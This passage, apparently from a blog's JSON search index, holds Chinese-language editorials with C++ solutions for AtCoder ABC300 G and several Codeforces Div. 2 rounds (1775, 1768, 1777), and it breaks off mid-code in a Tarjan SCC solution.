1) * n); } }; for (int i = 0; i &lt; n; i++) { ans = max(ans, cal(i)); } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; return 0;} G - P-smooth number 题解 枚举，用到了一种被称为 meet in the middle 的搜索技巧，具体可以参考： https://usaco.guide/gold/meet-in-the-middle?lang=cpp https://cses.fi/problemset/task/1628/ 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;bits/stdc++.h&gt;using namespace std;vector&lt;int&gt; minp, primes;void Init(int n) { minp.assign(n + 1, 0); primes.clear(); for (int i = 2; i &lt;= n; i++) { if (minp[i] == 0) { minp[i] = i; primes.push_back(i); } for (auto p : primes) { if (i * p &gt; n) { break; } minp[i * p] = p; if (p == minp[i]) { break; } } }}int main() { ios::sync_with_stdio(false); cin.tie(nullptr); long long n, p; cin &gt;&gt; n &gt;&gt; p; Init(p); vector&lt;long long&gt; a{1}, b{1}; auto cal = [&amp;](auto&amp; vec, int fac) { int sz = vec.size(); for (int i = 0; i &lt; sz; i++) { long long x = vec[i] * fac; while (x &lt;= n) { vec.push_back(x); x *= fac; } } }; for (auto fac : primes) { if (a.size() &lt; b.size()) { cal(a, fac); } else { cal(b, fac); } } sort(a.begin(), a.end()); sort(b.begin(), b.end()); long long ans = 0; for (int i = (int)b.size() - 1; auto x : a) { while (i &gt;= 0 and x * b[i] &gt; n) { i--; } if (i &gt;= 0) { ans += i + 1; } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; return 0;}","link":"/2023/04/30/ABC300/"},{"title":"Codeforces Round #843 (Div. 2)【A - E】","text":"做完 D 还有 15 分钟，E 题没来得及仔细想，其实蛮简单的…… 比赛链接：https://codeforces.com/contest/1775 A2. Gardener and the Capybaras (hard version) 题解 如果中间有 a ，可以单取一个 a 将 bbb 构造为最小串，否则取所有 b 将 bbb 构造为最大串。 代码 12345678910111213141516171819202122232425262728293031323334353637#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { string s; cin &gt;&gt; s; int m = s.size(); int pos = -1; for (int i = 1; i &lt; m - 1; i++) { if (s[i] == 'a') { pos = i; break; } } if (pos == -1) { cout &lt;&lt; s[0] &lt;&lt; ' '; cout &lt;&lt; s.substr(1, m - 2) &lt;&lt; ' '; cout &lt;&lt; s[m - 1] &lt;&lt; &quot;\\n&quot;; } else { cout &lt;&lt; s.substr(0, pos) &lt;&lt; ' '; cout &lt;&lt; 'a' &lt;&lt; ' '; cout &lt;&lt; s.substr(pos + 1) &lt;&lt; &quot;\\n&quot;; } } return 0;} B. Gardener and the Array 题解 如果存在某两个序列满足条件，那么向这两个序列同时添加某个数仍满足条件，最终可以添加至两个序列一个为整个数组，一个为整个数组去掉一个数。 所以只需判断去掉某个数后是否不影响整个数组的 | 值即可。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;vector&lt;int&gt;&gt; p(n); map&lt;int, int&gt; mp; for (int i = 0; i &lt; n; i++) { int k; cin &gt;&gt; k; p[i].resize(k); for (int j = 0; j &lt; k; j++) { cin &gt;&gt; p[i][j]; mp[p[i][j]] += 1; } } bool ok = false; for (int i = 0; i &lt; n; i++) { bool no_influence = true; for (auto x : p[i]) { if (mp[x] == 1) { no_influence = false; } } if (no_influence) { ok = true; } } cout &lt;&lt; (ok ? &quot;Yes&quot; : &quot;No&quot;) &lt;&lt; &quot;\\n&quot;; } return 0;} C. Interesting Sequence 题解 由于是 &amp; 操作，所以 xxx 中的 111 是 nnn 中的子集， x≤nx \\le nx≤n 。 当 nnn 与 xxx 第一个不同的位，该位为 01^1 _001​ ，为了置 000 ， nnn 必须 &amp; 上一个该位为 000 的数，同时这个数又必须大于 nnn ，所以该位前的某个 000 位需要置 111 ，置 111 的这位后面不能有 111 ，因为一定会取到置 111 这位后面全为 000 的某个值，所以第一个不同的位前一位及后面所有位必须是 000 ； 设在第 iii 位 nnn 与 xxx 不同， mmm 即 (n ∣ (1&lt;&lt;(i+1))) &amp; (∼((1&lt;&lt;(i+1))−1))(n\\ |\\ (1 &lt;&lt; (i + 1)))\\ \\&amp;\\ (\\sim((1 &lt;&lt; (i + 1)) - 1))(n ∣ (1&lt;&lt;(i+1))) &amp; (∼((1&lt;&lt;(i+1))−1)) 。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { long long n, x; cin &gt;&gt; n &gt;&gt; x; if ((n &amp; x) != x) { cout &lt;&lt; -1 &lt;&lt; &quot;\\n&quot;; } else if (n == x) { cout &lt;&lt; n &lt;&lt; &quot;\\n&quot;; } else { bool ok = true; bitset&lt;64&gt; bit_n(n), bit_x(x); for (int i = 63; i &gt;= 0; i--) { if (bit_n[i] == 1 and bit_x[i] == 0) { if (bit_n[i + 1] == 1) { ok = false; } if ((bit_x &amp; bitset&lt;64&gt;((1LL &lt;&lt; i) - 1)).any()) { ok = false; } if (ok) { cout &lt;&lt; ((bit_n | bitset&lt;64&gt;(1LL &lt;&lt; (i + 1))) &amp; bitset&lt;64&gt;(~((1LL &lt;&lt; (i + 1)) - 1))).to_ullong() &lt;&lt; &quot;\\n&quot;; } else { cout &lt;&lt; -1 &lt;&lt; &quot;\\n&quot;; } break; } } } } return 0;} D. Friendly Spiders 题解 对每个数内的素因子进行 BFS 。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int N = 3e5 + 10;vector&lt;int&gt; p(N);void Init() { iota(p.begin(), p.end(), 0); for (int i = 2; i &lt; N; i++) { if (p[i] != i) { continue; } for (int j = i; j &lt; N; j += i) { p[j] = i; } }}int main() { ios::sync_with_stdio(false); cin.tie(nullptr); Init(); int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); vector&lt;vector&lt;int&gt;&gt; div(N); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; int x = a[i]; while (x != 1) { int y = p[x]; while (x % y == 0) { x /= y; } div[y].push_back(i); } } int s, t; cin &gt;&gt; s &gt;&gt; t; --s, --t; vector&lt;int&gt; dis(n, 1e9), prv(n, -1); vector&lt;bool&gt; vis(N); queue&lt;int&gt; pque; pque.push(s); dis[s] = 0; while (not pque.empty()) { auto u = pque.front(); pque.pop(); if (u == t) { break; } int x = a[u]; while (x != 1) { int y = p[x]; while (x % y == 0) { x /= y; } if (vis[y]) { continue; } vis[y] = true; for (auto v : div[y]) { if (dis[v] &gt; dis[u] + 1) { dis[v] = dis[u] + 1; prv[v] = u; pque.push(v); } } } } if (dis[t] == 1e9) { cout &lt;&lt; -1 &lt;&lt; &quot;\\n&quot;; return 0; } vector&lt;int&gt; path; while (t != s) { path.push_back(t); t = prv[t]; } path.push_back(s); reverse(path.begin(), path.end()); cout &lt;&lt; path.size() &lt;&lt; &quot;\\n&quot;; for (auto x : path) { cout &lt;&lt; x + 1 &lt;&lt; ' '; } return 0;} E. The Human Equation 题解 对于当前的数 xxx ： 如果 x&gt;0x \\gt 0x&gt;0 ，则需要执行 xxx 次 - 操作，如果之前有最后执行 + 操作的序列，可以将 xxx 添加至这些序列的末尾，同时最后执行 - 操作的序列个数增加 xxx 个 如果 x&lt;0x \\lt 0x&lt;0 ，则需要执行 xxx 次 + 操作，如果之前有最后执行 - 操作的序列，可以将 xxx 添加至这些序列的末尾，同时最后执行 + 操作的序列个数增加 xxx 个 所以维护最后执行 加/减 操作的序列个数，从前往后遍历一遍数组，最终答案即两个序列的个数之和。 代码 12345678910111213141516171819202122232425262728293031323334353637#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;long long&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } long long add = 0, sub = 0; for (int i = 0; i &lt; n; i++) { if (a[i] == 0) { continue; } if (a[i] &gt; 0) { add -= min(add, a[i]); sub += a[i]; } else { sub -= min(sub, -a[i]); add += -a[i]; } } cout &lt;&lt; add + sub &lt;&lt; &quot;\\n&quot;; } return 0;}","link":"/2023/01/11/CF-1775/"},{"title":"Codeforces Round #842 (Div. 2)【A - E】","text":"五十分钟四题 1A 下班，赛后补了下 E 。 比赛链接：https://codeforces.com/contest/1768 A. Greatest Convex 题解 x!+(x−1)!=(x+1)⋅(x−1)!x! + (x - 1)! = (x + 1) \\cdot (x - 1)!x!+(x−1)!=(x+1)⋅(x−1)! 当 x=k−1x = k - 1x=k−1 时，原式为 k⋅(k−2)!k \\cdot (k - 2)!k⋅(k−2)! ，显然为 kkk 的倍数。 代码 12345678910111213141516171819#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int k; cin &gt;&gt; k; cout &lt;&lt; (k - 1) &lt;&lt; &quot;\\n&quot;; } return 0;} B. Quick Sort 题解 找以 1 开头的最长连续上升子序列，其他数都需要操作后移到尾部，次数即对 kkk 取上整。 代码 12345678910111213141516171819202122232425262728293031#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; p(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; p[i]; } int cnt = n, val = 1; for (int i = 0; i &lt; n; i++) { if (p[i] == val) { val++; cnt--; } } cout &lt;&lt; (cnt + k - 1) / k &lt;&lt; &quot;\\n&quot;; } return 0;} C. Elemental Decompress 题解 如果有数出现三次则无解。 否则，将第一次出现的数和第二次出现的数分别赋给 p,qp, qp,q ，其余位置的数用 set 的 upper_bound 贪心查找即可。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n), cnt(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; --a[i]; cnt[a[i]] += 1; } bool ok = true; for (int i = 0; i &lt; n; i++) { if (cnt[i] &gt;= 3) { ok = false; break; } } if (not ok) { cout &lt;&lt; &quot;NO&quot; &lt;&lt; &quot;\\n&quot;; continue; } vector&lt;int&gt; p(n, -1), q(n, -1); vector&lt;bool&gt; vis(n); for (int i = 0; i &lt; n; i++) { if (not vis[a[i]]) { p[i] = a[i]; vis[a[i]] = true; } } for (int i = 0; i &lt; n; i++) { if (vis[a[i]] and p[i] == -1) { q[i] = a[i]; } } auto fill_blank = [&amp;](vector&lt;int&gt;&amp; p, vector&lt;int&gt;&amp; q) { set&lt;int&gt; st; for (int i = 0; i &lt; n; i++) { st.insert(i); } for (int i = 0; i &lt; n; i++) { st.erase(p[i]); } for (int i = 0; i &lt; (int)p.size(); i++) { if (p[i] == -1 and q[i] != -1) { auto it = st.upper_bound(q[i]); if (it == st.begin()) { ok = false; return; } --it; p[i] = *it; st.erase(it); } } }; fill_blank(p, q); fill_blank(q, p); if (not ok) { cout &lt;&lt; &quot;NO&quot; &lt;&lt; &quot;\\n&quot;; } else { cout &lt;&lt; &quot;YES&quot; &lt;&lt; &quot;\\n&quot;; for (int i = 0; i &lt; n; i++) { cout &lt;&lt; p[i] + 1 &lt;&lt; &quot; \\n&quot;[i == n - 1]; } for (int i = 0; i &lt; n; i++) { cout &lt;&lt; q[i] + 1 &lt;&lt; &quot; \\n&quot;[i == n - 1]; } } } return 0;} D. Lucky Permutation 题解 只有一个逆序对即交换升序排列中的某对相邻值。 找出 ppp 中的所有循环节，长度为 kkk 的循环节需要 k−1k - 1k−1 次操作使得每个值回到自己对应的位置上。 若某个循环节里存在相邻值，则最后排为升序时可以减少一次操作来使这两个相邻值形成逆序。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; p(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; p[i]; --p[i]; } int ans = 0; bool ok = false; vector&lt;bool&gt; vis(n); for (int i = 0; i &lt; n; i++) { if (vis[i]) { continue; } vector&lt;int&gt; v; int j = i, res = -1; while (not vis[j]) { vis[j] = true; v.push_back(p[j]); j = p[j]; res += 1; } sort(v.begin(), v.end()); for (int j = 0; j + 1 &lt; (int)v.size(); j++) { if (v[j] + 1 == v[j + 1]) { ok = true; } } ans += res; } cout &lt;&lt; (ans + (ok ? -1 : 1)) &lt;&lt; &quot;\\n&quot;; } return 0;} E. Partial Sorting 题解 当 [1,n][1, n][1,n] 在后 nnn 个位置或 [2n+1,3n][2n + 1, 3n][2n+1,3n] 在前 nnn 个位置时需要操作 333 次 当 [1,n][1, n][1,n] 在前 2n2n2n 个位置或 [2n+1,3n][2n + 1, 3n][2n+1,3n] 在后 2n2n2n 个位置时需要操作 222 次 当前 nnn 个位置已有序或后 nnn 个位置已有序时需要操作 111 次 当 3n3n3n 个位置整体有序时不需要操作 由于不好单独计算某一操作次数的排列数，可以用容斥原理从低到高依次计算。 操作 000 次， 3n3n3n 个位置整体有序， 111 种情况 操作 ≤1\\le 1≤1 次： 前 nnn 个位置有序：共有 2n!2n!2n! 种情况 后 nnn 个位置有序：共有 2n!2n!2n! 种情况 二者交集，即前后 nnn 个位置都有序，此时只有 [n+1,2n][n + 1, 2n][n+1,2n] 在中间 nnn 个位置排列，共有 n!n!n! 种情况 所以共有 2⋅2n!−n!2 \\cdot 2n! - n!2⋅2n!−n! 种情况 操作 ≤2\\le 2≤2 次： [1,n][1, n][1,n] 在前 2n2n2n 个位置，共有 C2nn⋅n!⋅2n!C_{2n}^{n} \\cdot n! \\cdot 2n!C2nn​⋅n!⋅2n! 种情况 [2n+1,3n][2n + 1, 3n][2n+1,3n] 在后 2n2n2n 个位置，共有 C2nn⋅n!⋅2n!C_{2n}^{n} \\cdot n! \\cdot 2n!C2nn​⋅n!⋅2n! 种情况 二者交集，即 [1,n][1, n][1,n] 在前 2n2n2n 个位置，同时 [2n+1,3n][2n + 1, 3n][2n+1,3n] 在后 2n2n2n 个位置： 设 [1,n][1, n][1,n] 在前 nnn 个位置中有 iii 个，那么在中间 nnn 个位置中有 n−in - in−i 个，共有 Cni⋅Cnn−i⋅n!C_{n}^{i} \\cdot C_{n}^{n - i} \\cdot n!Cni​⋅Cnn−i​⋅n! 种情况 此时 [2n+1,3n][2n + 1, 3n][2n+1,3n] 需要填补前 nnn 个位置中 n−in - in−i 个空缺，同时在后 2n−(n−i)2n - (n - i)2n−(n−i) 个位置中选取 iii 个位置，共有 C2n−(n−i)i⋅n!C_{2n - (n - i)}^{i} \\cdot n!C2n−(n−i)i​⋅n! 种情况 最后 [2n+1,3n][2n + 1, 3n][2n+1,3n] 填补后 2n2n2n 个位置中余下的 nnn 个位置，共有 n!n!n! 种情况 所以共有 2⋅C2nn⋅n!⋅2n!−∑i=0n(Cni⋅Cnn−i⋅n!)⋅(C2n−(n−i)i⋅n!)⋅(n!)2 \\cdot C_{2n}^{n} \\cdot n! \\cdot 2n! - \\sum \\limits _{i = 0} ^{n} (C_{n}^{i} \\cdot C_{n}^{n - i} \\cdot n!) \\cdot (C_{2n - (n - i)}^{i} \\cdot n!) \\cdot (n!)2⋅C2nn​⋅n!⋅2n!−i=0∑n​(Cni​⋅Cnn−i​⋅n!)⋅(C2n−(n−i)i​⋅n!)⋅(n!) 种情况 操作 ≤3\\le 3≤3 次： 共有 3n!3n!3n! 种情况 依次相减得出操作次数等于 iii 次的情况数 cnticnt_icnti​ ，答案即 ∑i=13i⋅cnti\\sum \\limits _{i = 1} ^{3} i \\cdot cnt_ii=1∑3​i⋅cnti​ 。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;bits/stdc++.h&gt;using namespace std;int MOD = 998244353;int norm(int x) { if (x &lt; 0) { x += MOD; } if (x &gt;= MOD) { x -= MOD; } return x; }template&lt;class T&gt; T binpow(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; }struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(MOD - x)); } Z inv() const { assert(x != 0); return binpow(*this, MOD - 2); } Z &amp;operator*=(const Z &amp;rhs) { x = 1LL * x * rhs.x % MOD; return *this; } Z &amp;operator+=(const Z &amp;rhs) { x = norm(x + rhs.x); return *this; } Z &amp;operator-=(const Z &amp;rhs) { x = norm(x - rhs.x); return *this; } Z &amp;operator/=(const Z &amp;rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res /= rhs; return res; }};struct Combination { vector&lt;Z&gt; fac, inv; Combination(int n) : fac(n), inv(n) { fac[0] = 1; for (int i = 1; i &lt; n; i++) fac[i] = fac[i - 1] * i; inv[n - 1] = fac[n - 1].inv(); for (int i = n - 2; i &gt;= 0; i--) inv[i] = inv[i + 1] * (i + 1); } Z C(int n, int m){ if(m &lt; 0 or m &gt; n) return 0; return fac[n] * inv[m] * inv[n - m]; } Z A(int n, int m){ if(m &lt; 0 or m &gt; n) return 0; return fac[n] * inv[n - m]; }};int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n; cin &gt;&gt; n &gt;&gt; MOD; Combination C(3 * n + 1); Z cnt0 = 1; Z cnt1 = Z(2) * C.fac[2 * n] - C.fac[n] - cnt0; Z cnt2 = Z(2) * C.C(2 * n, n) * C.fac[n] * C.fac[2 * n] - cnt1 - cnt0; for (int i = 0; i &lt;= n; i++) { cnt2 -= C.C(n, i) * C.C(n, n - i) * C.C(2 * n - (n - i), i) * C.fac[n] * C.fac[n] * C.fac[n]; } Z cnt3 = C.fac[3 * n] - cnt2 - cnt1 - cnt0; cout &lt;&lt; (cnt1 + 2 * cnt2 + 3 * cnt3).val() &lt;&lt; &quot;\\n&quot;; return 0;}","link":"/2023/01/06/CF%201768/"},{"title":"Codeforces Round #845 (Div. 2) and ByteRace 2023【A - E】","text":"C 题想用区间最值结果没有板子，其实在加减时直接判断就可以。 比赛链接：https://codeforces.com/contest/1777 A. Everybody Likes Good Arrays! 题解 每个连续奇偶性相同的段都只留下一个数。 代码 123456789101112131415161718192021222324252627282930313233#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } int ans = 0; for (int i = 0; i &lt; n; ) { int j = i + 1; while (j &lt; n and a[j] % 2 == a[i] % 2) { j++; } ans += j - i - 1; i = j; } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} B. Emordnilap 题解 对于某一数对 (i,j)(i, j)(i,j) ，设 i&lt;ji &lt; ji&lt;j ，相对排列有两种方式： iii 在前，相对位置为： i,j,j,ii, j, j, ii,j,j,i ，有 222 个逆序对 jjj 在前，相对位置为： j,i,i,jj, i, i, jj,i,i,j ，有 222 个逆序对 所以共有 n!⋅Cn2⋅2n! \\cdot C_n^2 \\cdot 2n!⋅Cn2​⋅2 个逆序对。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int MOD = 1e9 + 7;constexpr int N = 1e5 + 10;int norm(int x) { if (x &lt; 0) { x += MOD; } if (x &gt;= MOD) { x -= MOD; } return x; }template&lt;class T&gt; T binpow(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; }struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(MOD - x)); } Z inv() const { assert(x != 0); return binpow(*this, MOD - 2); } Z &amp;operator*=(const Z &amp;rhs) { x = 1LL * x * rhs.x % MOD; return *this; } Z &amp;operator+=(const Z &amp;rhs) { x = norm(x + rhs.x); return *this; } Z &amp;operator-=(const Z &amp;rhs) { x = norm(x - rhs.x); return *this; } Z &amp;operator/=(const Z &amp;rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res /= rhs; return res; }};struct Combination { vector&lt;Z&gt; fac, inv; Combination(int n) : fac(n), inv(n) { fac[0] = 1; for (int i = 1; i &lt; n; i++) fac[i] = fac[i - 1] * i; inv[n - 1] = fac[n - 1].inv(); for (int i = n - 2; i &gt;= 0; i--) inv[i] = inv[i + 1] * (i + 1); } Z C(int n, int m){ if(m &lt; 0 or m &gt; n) return 0; return fac[n] * inv[m] * inv[n - m]; } Z A(int n, int m){ if(m &lt; 0 or m &gt; n) return 0; return fac[n] * inv[n - m]; }};int main() { ios::sync_with_stdio(false); cin.tie(nullptr); Combination C(N); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; cout &lt;&lt; (C.fac[n] * C.C(n, 2) * 2).val() &lt;&lt; &quot;\\n&quot;; } return 0;} C. Quiz Master 题解 答案只与最值差有关，排序后双指针模拟。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int N = 1e5 + 10;vector d(N, vector&lt;int&gt;());void Init() { for (int i = 1; i &lt; N; i++) { for (int j = 1; j * j &lt;= i; j++) { if (i % j == 0) { d[i].push_back(j); if (j != i / j) { d[i].push_back(i / j); } } } }}int main() { ios::sync_with_stdio(false); cin.tie(nullptr); Init(); int t; cin &gt;&gt; t; while (t--) { int n, m; cin &gt;&gt; n &gt;&gt; m; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } sort(a.begin(), a.end()); vector&lt;int&gt; cnt(m + 1); int vis = 0; auto op = [&amp;](int x, bool add) { for (auto i : d[x]) { if (i &gt; m) { continue; } if (cnt[i] == 0) { vis++; } cnt[i] += (add ? 1 : -1); if (cnt[i] == 0) { vis--; } } }; int ans = INT_MAX; for (int l = 0, r = 0; l &lt; n; l++) { while (r &lt; n and vis != m) { op(a[r], true); r++; } if (vis == m) { ans = min(ans, a[r - 1] - a[l]); } op(a[l], false); } cout &lt;&lt; (ans == INT_MAX ? -1 : ans) &lt;&lt; &quot;\\n&quot;; } return 0;} D. Score of a Tree 题解 对于某一结点 uuu ： uuu 在第 iii 秒的值是以 uuu 为根节点的子树内与 uuu 距离为 iii 的所有结点初始值的异或 设子树内最大深度为 dmaxd_{max}dmax​ ，则在 dmax+1d_{max} + 1dmax​+1 秒后结点 uuu 的值为 000 在 0∼dmax0 \\sim d_{max}0∼dmax​ 秒，结点 uuu 值的期望都为 12\\frac{1}{2}21​ （ kkk 个布尔值选奇数项赋 111 ，有一半情况） 共有 2n2^n2n 种情况，每个结点值的期望为 (dmax+1)2\\frac{(d_{max} + 1)}{2}2(dmax​+1)​ ，答案为 2n−1⋅∑i=1n(dmax+1)2^{n - 1} \\cdot \\sum \\limits _{i = 1} ^{n} (d_{max} + 1)2n−1⋅i=1∑n​(dmax​+1) ，其中 dmaxd_{max}dmax​ 可以在 DFS 中线性计算。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int MOD = 1e9 + 7;int norm(int x) { if (x &lt; 0) { x += MOD; } if (x &gt;= MOD) { x -= MOD; } return x; }template&lt;class T&gt; T binpow(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; }struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(MOD - x)); } Z inv() const { assert(x != 0); return binpow(*this, MOD - 2); } Z &amp;operator*=(const Z &amp;rhs) { x = 1LL * x * rhs.x % MOD; return *this; } Z &amp;operator+=(const Z &amp;rhs) { x = norm(x + rhs.x); return *this; } Z &amp;operator-=(const Z &amp;rhs) { x = norm(x - rhs.x); return *this; } Z &amp;operator/=(const Z &amp;rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res /= rhs; return res; }};int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;vector&lt;int&gt;&gt; G(n); for (int i = 0; i &lt; n - 1; i++) { int u, v; cin &gt;&gt; u &gt;&gt; v; --u, --v; G[u].push_back(v); G[v].push_back(u); } vector&lt;int&gt; dp(n); function&lt;void(int, int)&gt; dfs = [&amp;](int u, int p) { dp[u] = 1; for (auto v : G[u]) { if (v != p) { dfs(v, u); dp[u] = max(dp[u], dp[v] + 1); } } }; dfs(0, -1); cout &lt;&lt; (binpow(Z(2), n - 1) * accumulate(dp.begin(), dp.end(), Z(0))).val() &lt;&lt; &quot;\\n&quot;; } return 0;} E. Edge Reverse 题解 二分边权，小于等于 midmidmid 的边建双向边，然后用强连通分量中的 Tarjan 或 Kosaraju 算法找出发点。 代码 Kosaraju 版： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, m; cin &gt;&gt; n &gt;&gt; m; vector&lt;int&gt; u(m), v(m), w(m); for (int i = 0; i &lt; m; i++) { cin &gt;&gt; u[i] &gt;&gt; v[i] &gt;&gt; w[i]; --u[i], --v[i]; } vector&lt;int&gt; p(m); iota(p.begin(), p.end(), 0); sort(p.begin(), p.end(), [&amp;](int x, int y) { return w[x] &lt; w[y]; }); int l = 0, r = 1e9 + 10; auto ok = [&amp;](int mid) { vector&lt;vector&lt;int&gt;&gt; G(n); for (auto i : p) { G[u[i]].push_back(v[i]); if (w[i] &lt;= mid) { G[v[i]].push_back(u[i]); } } vector&lt;bool&gt; vis(n); int root = -1; function&lt;void(int)&gt; dfs = [&amp;](int u) { // Kosaraju vis[u] = true; for (auto v : G[u]) { if (not vis[v]) { dfs(v); } } root = u; }; for (int i = 0; i &lt; n; i++) { if (not vis[i]) { dfs(i); } } vis.assign(n, false); dfs(root); return all_of(vis.begin(), vis.end(), [](bool x) { return x == true; }); }; while (l &lt; r) { int mid = (l + r) / 2; if (ok(mid)) { r = mid; } else { l = mid + 1; } } cout &lt;&lt; (l == 1e9 + 10 ? -1 : l) &lt;&lt; &quot;\\n&quot;; } return 0;} Tarjan 版： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, m; cin &gt;&gt; n &gt;&gt; m; vector&lt;int&gt; u(m), v(m), w(m); for (int i = 0; i &lt; m; i++) { cin &gt;&gt; u[i] &gt;&gt; v[i] &gt;&gt; w[i]; --u[i], --v[i]; } vector&lt;int&gt; p(m); iota(p.begin(), p.end(), 0); sort(p.begin(), p.end(), [&amp;](int x, int y) { return w[x] &lt; w[y]; }); int l = 0, r = 1e9 + 10; auto ok = [&amp;](int mid) { vector&lt;vector&lt;int&gt;&gt; G(n); for (auto i : p) { G[u[i]].push_back(v[i]); if (w[i] &lt;= mid) { G[v[i]].push_back(u[i]); } } vector&lt;int&gt; low(n), dfn(n), sccno(n); int ck = 0, scc_cnt = 0; stack&lt;int&gt; stk; function&lt;void(int)&gt; tarjan = [&amp;](int u) { low[u] = dfn[u] = ++ck; stk.push(u); for (auto v : G[u]) { if (dfn[v] == 0) { tarjan(v); low[u] = min(low[u], low[v]); } else if (sccno[v] == 0) { low[u] = min(low[u], dfn[v]); } } if (low[u] == dfn[u]) { scc_cnt++; while (1) { int x = stk.top(); stk.pop(); sccno[x] = scc_cnt; if (x == u) { break; } } } }; for (int i = 0; i &lt; n; i++) { if (dfn[i] == 0) { tarjan(i); } } vector&lt;bool&gt; vis(n); function&lt;void(int)&gt; dfs = [&amp;](int u) { vis[u] = true; for (auto v : G[u]) { if (not vis[v]) { dfs(v); } } }; for (int i 